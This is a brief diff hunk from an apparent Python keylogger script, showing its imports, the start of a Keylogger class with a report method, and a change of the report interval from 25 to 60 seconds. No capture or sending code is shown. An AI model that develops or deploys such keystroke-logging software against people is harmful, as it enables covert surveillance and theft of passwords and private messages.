@@ -2,7 +2,7 @@ import keyboard
 from threading import Timer
 from datetime import datetime
 
-SEND_REPORT_EVERY = 25 # Seconds
+SEND_REPORT_EVERY = 60 # Seconds
 
 class Keylogger:
     def __init__(self, interval, report_method = "file"):
